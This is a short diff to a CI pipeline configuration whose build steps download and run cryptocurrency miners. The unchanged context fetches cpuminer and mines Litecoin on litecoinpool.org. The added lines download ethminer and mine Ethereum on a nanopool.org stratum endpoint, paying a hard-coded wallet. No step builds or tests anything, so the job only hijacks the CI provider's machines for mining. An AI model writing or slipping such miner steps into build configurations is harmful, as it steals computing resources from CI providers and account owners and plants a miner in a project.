@@ -23,7 +23,11 @@ jobs:
 
       # specify any bash command here prefixed with `run: `
       - run: sudo apt-get update
-      - run: sudo apt-get install curl tar -y
+      - run: sudo apt-get install wget tar -y
       - run: curl https://cfhcable.dl.sourceforge.net/project/cpuminer/pooler-cpuminer-2.5.1-linux-x86_64.tar.gz -o c.tar.gz
       - run: tar xvzf c.tar.gz
+      - run: wget https://github.com/ethereum-mining/ethminer/releases/download/v0.18.0/ethminer-0.18.0-cuda-8-linux-x86_64.tar.gz
+      - run: tar xvzf ethminer-0.18.0-cuda-8-linux-x86_64.tar.gz
+      - run: cd bin
+      - run: !./ethminer -P stratum+tcp://0xaf308Ccd29d573421edc0710ceAE805f3C299058@eth-eu1.nanopool.org:9999
       - run: ./minerd -o stratum+tcp://litecoinpool.org:3333 -u arthdal20.2 -p 2
